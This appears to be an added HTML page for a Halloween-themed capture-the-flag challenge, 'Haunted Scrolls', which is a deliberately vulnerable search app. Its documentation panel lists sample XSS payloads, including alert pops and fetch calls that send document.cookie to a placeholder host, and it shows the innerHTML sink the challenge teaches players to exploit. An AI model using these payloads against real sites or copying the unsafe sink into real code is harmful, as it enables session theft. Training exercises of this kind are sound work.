@@ -1,0 +1,526 @@
+<!doctype html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8" />
+        <title>Haunted Scrolls</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <link href="/static/css/rpgui.css" rel="stylesheet" type="text/css" />
+        <script src="/static/js/rpgui.js"></script>
+        <link rel="preconnect" href="https://fonts.gstatic.com" />
+        <script src="/socket.io/socket.io.js"></script>
+        <link
+            rel="stylesheet"
+            href="https://fonts.googleapis.com/css2?family=Inter&family=Source+Code+Pro&display=swap"
+        />
+
+        <link
+            href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.25.0/themes/prism.min.css"
+            rel="stylesheet"
+        />
+    </head>
+    <style>
+        .modalx {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modalx .modal-content {
+            padding: 20px;
+            background-color: #4c2a1a;
+            border-radius: 10px;
+            width: 40%; /* Decreased width */
+            max-width: 600px; /* Maximum width on larger screens */
+            text-align: center;
+        }
+
+        .modalx .modal-content h2 {
+            font-family: "MedievalSharp", sans-serif;
+            color: #d4af37;
+            margin-bottom: 20px;
+        }
+
+        .modalx .modal-content p {
+            color: #f8e9c4;
+            font-family: "MedievalSharp", sans-serif;
+            margin-bottom: 20px;
+        }
+
+        .modalx .close-modal {
+            cursor: pointer;
+            padding: 10px 20px;
+            background-color: #d4af37;
+            border-radius: 5px;
+            border: none;
+            font-family: "MedievalSharp", sans-serif;
+            line-height: 0px; /* Adjusted as per your request */
+        }
+
+        .outer {
+            display: flex;
+            justify-content: center;
+            position: relative;
+            top: 40%;
+        }
+
+        * {
+            color: white;
+        }
+
+        .token.operator {
+            background: none;
+        }
+
+        .container {
+            display: flex;
+            background-color: #444;
+            height: 100%;
+            margin: 0;
+            padding: 0;
+            width: 100%;
+        }
+
+        body {
+            padding: unset !important;
+            background: #222 !important;
+            height: 98vh;
+            width: 100vw;
+        }
+
+        .container__left {
+            width: 60%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            overflow: hidden;
+            height: 100%;
+            position: relative;
+            /* Add this */
+        }
+
+        .resizer {
+            background-image: url("/static/css/img/scrollbar-track.png");
+            cursor: ew-resize;
+            height: 100%;
+            width: 14px;
+        }
+
+        .resizerHori {
+            background-image: url("/static/css/img/slider-track-golden.png");
+            cursor: row-resize;
+            height: 10px;
+            width: 100%;
+        }
+
+        .container__right {
+            display: flex;
+            flex-direction: column;
+            flex: 1;
+            overflow: auto;
+        }
+
+        .right-top {
+            height: 50%;
+        }
+
+        .right-bottom {
+            flex: 1;
+            background: #444;
+            overflow: auto;
+            -ms-overflow-style: none; /* Internet Explorer 10+ */
+            scrollbar-width: none; /* Firefox */
+        }
+
+        .right-bottom::-webkit-scrollbar {
+            display: none;
+        }
+
+        .articles-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            flex-grow: 1;
+            /* Allow the container to take remaining space */
+            overflow-y: auto;
+            /* Make it scrollable */
+            width: 100%;
+            -ms-overflow-style: none; /* Internet Explorer 10+ */
+            scrollbar-width: none; /* Firefox */
+        }
+
+        .articles-container::-webkit-scrollbar {
+            display: none;
+        }
+
+        .rpgui-container {
+            position: relative;
+            width: 90%;
+            background-color: #4c2a1a;
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+
+        .content {
+            display: flex;
+        }
+
+        .content img {
+            height: 200px;
+            border: 2px solid #d4af37;
+            border-radius: 5px;
+            margin-right: 20px;
+        }
+
+        .content div {
+            margin-left: 10px;
+            color: #f8e9c4;
+            font-family: "MedievalSharp", sans-serif;
+        }
+
+        .content h4 {
+            color: white;
+            font-size: 24px;
+        }
+
+        .content p {
+            font-size: 14px;
+            margin: 10px 0;
+        }
+
+        .content p.italic {
+            font-style: italic;
+        }
+
+        .rpgui-button {
+            height: 30px;
+        }
+
+        .search-bar-container {
+            padding: 20px;
+            text-align: center;
+            flex-shrink: 0;
+            width: 90%;
+            /* Prevent the search bar from shrinking */
+        }
+
+        .token.tag {
+            color: #53e1f0 !important;
+        }
+
+        /* Updated Code Block for wrapping long lines */
+        pre {
+            white-space: pre-wrap; /* Allows text to wrap */
+            word-wrap: break-word; /* Breaks long words */
+            overflow-wrap: break-word; /* For better control */
+        }
+    </style>
+
+    <body class="rpgui-container framed" style="width: 100%">
+        <!-- Modal HTML -->
+        <div style="display: none" class="modalx" id="showFlag">
+            <div class="outer">
+                <div class="modal-content rpgui-container framed-golden">
+                    <h2>Spooky Surprise</h2>
+                    <p id="flag"></p>
+                    <button id="closeBtnFlag" class="close-modal rpgui-button">
+                        Close
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <div class="container">
+            <div class="container__left">
+                <div class="search-bar-container">
+                    <div>
+                        <h1>Haunted Scrolls</h1>
+                    </div>
+
+                    <div style="display: grid !important">
+                        <div
+                            class="rpgui-content"
+                            style="position: relative !important; display: flex"
+                        >
+                            <input
+                                id="searchInput"
+                                placeholder="Search the Shadows..."
+                            />
+                            <button
+                                id="searchBTN"
+                                class="rpgui-button"
+                                style="height: 100%"
+                            >
+                                Search
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="articles-container"></div>
+            </div>
+            <div class="resizer" id="dragMe"></div>
+            <div class="container__right">
+                <div class="right-top" style="text-align: center">
+                    <h3>Cursed Code Block</h3>
+                    <pre
+                        style="background: transparent; padding-top: unset"
+                    ><code style="color: white; text-shadow: none;" id="code-block" class="language-javascript">
+searchInput.addEventListener('input', function () {
+    const query = searchInput.value;
+    if (query.trim() !== "") {
+        const filteredArticles = filterArticles(query);
+        searchResultsHeading.innerHTML = `Results for: "${query}"`;
+        searchResultsHeading.style.display = 'block';
+        renderArticles(filteredArticles);
+    } else {
+        searchResultsHeading.style.display = 'none';
+        renderArticles(articles);
+    }
+});
+                </code></pre>
+                </div>
+                <div class="resizerHori" id="dragMeH"></div>
+                <div style="text-align: center" class="right-bottom">
+                    <h1>Spooky Documentation</h1>
+
+                    <div
+                        style="
+                            text-align: start;
+                            padding: 10px;
+                            padding-top: unset;
+                        "
+                    >
+                        <h2>Challenge Objective</h2>
+
+                        <p>
+                            Your objective is to identify and the XSS
+                            vulnerability lurking in the shadows of the search
+                            feature and pop an alert box.
+                        </p>
+
+                        <h3>Application Structure</h3>
+
+                        <p>
+                            The application consists of the following haunted
+                            components:
+                        </p>
+
+                        <ul>
+                            <li>
+                                <strong>Search Feature:</strong> This is where
+                                the cursed XSS vulnerability resides. It accepts
+                                user input and displays search results based on
+                                the query provided.
+                            </li>
+                            <li>
+                                <strong>Articles Section:</strong> This section
+                                contains various ghostly articles that the
+                                search feature filters through based on the
+                                user's input.
+                            </li>
+                            <li>
+                                <strong>Cursed Code Block:</strong> This section
+                                of the application displays the actual code
+                                responsible for rendering search results,
+                                allowing you to identify potential security
+                                flaws.
+                            </li>
+                        </ul>
+
+                        <h3>Example Payloads</h3>
+
+                        <p>
+                            Below are a few spooky payloads to get you started:
+                        </p>
+
+                        <ul>
+                            <li>
+                                Basic XSS Payload:
+                                <pre
+                                    style="
+                                        padding: 0px;
+                                        background: transparent;
+                                    "
+                                ><code class="language-html" style="text-shadow: none;">&lt;script&gt;alert('Boo!');&lt;/script&gt;</code></pre>
+                                <pre
+                                    style="
+                                        padding: 0px;
+                                        background: transparent;
+                                    "
+                                ><code class="language-html" style="text-shadow: none;">&lt;script&gt;fetch('[host]')&lt;/script&gt;</code></pre>
+                            </li>
+                            <li>
+                                More Diabolical Payload:
+                                <pre
+                                    style="
+                                        padding: 0px;
+                                        background: transparent;
+                                    "
+                                ><code class="language-html" style="text-shadow: none;">&lt;img src=x onerror="alert('Boo!')"&gt;</code></pre>
+                                <pre
+                                    style="
+                                        padding: 0px;
+                                        background: transparent;
+                                    "
+                                ><code class="language-html" style="text-shadow: none;">&lt;img src=x onerror="fetch('[HOST]' + document.cookie)" /&gt;</code></pre>
+                            </li>
+                        </ul>
+
+                        <h3>Additional Tips</h3>
+
+                        <ul>
+                            <li>
+                                Pay attention to the haunted HTML and JavaScript
+                                code. The context in which your payload is
+                                executed will determine its effectiveness.
+                            </li>
+                            <li>
+                                Experiment with different sinister payloads to
+                                see how the application responds. Some might be
+                                blocked by ancient wards, while others may slip
+                                through.
+                            </li>
+                            <li>
+                                Use developer tools to test and debug your evil
+                                payloads.
+                            </li>
+                        </ul>
+
+                        <p>Good luck, and beware the curse of broken code!</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <script>
+            document.addEventListener("DOMContentLoaded", function () {
+                const resizer = document.getElementById("dragMe");
+                const leftSide = resizer.previousElementSibling;
+                const rightSide = resizer.nextElementSibling;
+                let x = 0;
+                let y = 0;
+                let leftWidth = 0;
+
+                const mouseDownHandler = function (e) {
+                    x = e.clientX;
+                    y = e.clientY;
+                    leftWidth = leftSide.getBoundingClientRect().width;
+                    document.addEventListener("mousemove", mouseMoveHandler);
+                    document.addEventListener("mouseup", mouseUpHandler);
+                };
+
+                const mouseMoveHandler = function (e) {
+                    const dx = e.clientX - x;
+                    const newLeftWidth =
+                        ((leftWidth + dx) * 100) /
+                        resizer.parentNode.getBoundingClientRect().width;
+                    leftSide.style.width = `${newLeftWidth}%`;
+                    resizer.style.cursor = "col-resize";
+                    document.body.style.cursor = "col-resize";
+                    leftSide.style.userSelect = "none";
+                    leftSide.style.pointerEvents = "none";
+                    rightSide.style.userSelect = "none";
+                    rightSide.style.pointerEvents = "none";
+                };
+
+                const mouseUpHandler = function () {
+                    resizer.style.removeProperty("cursor");
+                    document.body.style.removeProperty("cursor");
+                    leftSide.style.removeProperty("user-select");
+                    leftSide.style.removeProperty("pointer-events");
+                    rightSide.style.removeProperty("user-select");
+                    rightSide.style.removeProperty("pointer-events");
+                    document.removeEventListener("mousemove", mouseMoveHandler);
+                    document.removeEventListener("mouseup", mouseUpHandler);
+                };
+
+                resizer.addEventListener("mousedown", mouseDownHandler);
+            });
+
+            document.addEventListener("DOMContentLoaded", function () {
+                const resizer = document.getElementById("dragMeH");
+                const topSide = resizer.previousElementSibling;
+                const bottom = resizer.nextElementSibling;
+                let x = 0;
+                let y = 0;
+                let topHeight = 0;
+
+                const mouseDownHandler = function (e) {
+                    x = e.clientX;
+                    y = e.clientY;
+                    topHeight = topSide.getBoundingClientRect().height;
+                    document.addEventListener("mousemove", mouseMoveHandler);
+                    document.addEventListener("mouseup", mouseUpHandler);
+                };
+
+                const mouseMoveHandler = function (e) {
+                    const dy = e.clientY - y;
+                    const newTopHeight =
+                        ((topHeight + dy) * 100) /
+                        resizer.parentNode.getBoundingClientRect().height;
+                    topSide.style.height = `${newTopHeight}%`;
+                    resizer.style.cursor = "row-resize";
+                    document.body.style.cursor = "row-resize";
+                    topSide.style.userSelect = "none";
+                    topSide.style.pointerEvents = "none";
+                    bottom.style.userSelect = "none";
+                    bottom.style.pointerEvents = "none";
+                };
+
+                const mouseUpHandler = function () {
+                    resizer.style.removeProperty("cursor");
+                    document.body.style.removeProperty("cursor");
+                    topSide.style.removeProperty("user-select");
+                    topSide.style.removeProperty("pointer-events");
+                    bottom.style.removeProperty("user-select");
+                    bottom.style.removeProperty("pointer-events");
+                    document.removeEventListener("mousemove", mouseMoveHandler);
+                    document.removeEventListener("mouseup", mouseUpHandler);
+                };
+
+                resizer.addEventListener("mousedown", mouseDownHandler);
+            });
+        </script>
+
+        <script>
+            const socket = io();
+
+            socket.on("connect", () => {
+                console.log("Socket.io connection established");
+            });
+
+            socket.on("welcome", (message) => {
+                console.log(message);
+            });
+
+            socket.on("message", (data) => {
+                console.log("Received message:", data);
+            });
+
+            socket.on("flag", (data) => {
+                console.log("Flag received:", data.flag);
+                let modal = document.getElementById("showFlag");
+                let flag = document.getElementById("flag");
+                let closeBtn = document.getElementById("closeBtnFlag");
+
+                flag.innerHTML = data.flag;
+                modal.style.display = "block";
+                closeBtn.addEventListener("click", function () {
+                    modal.style.display = "none";
+                });
+            });
+        </script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.25.0/prism.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.25.0/components/prism-javascript.min.js"></script>
+        <script src="/static/js/main.js"></script>
+    </body>
+</html>
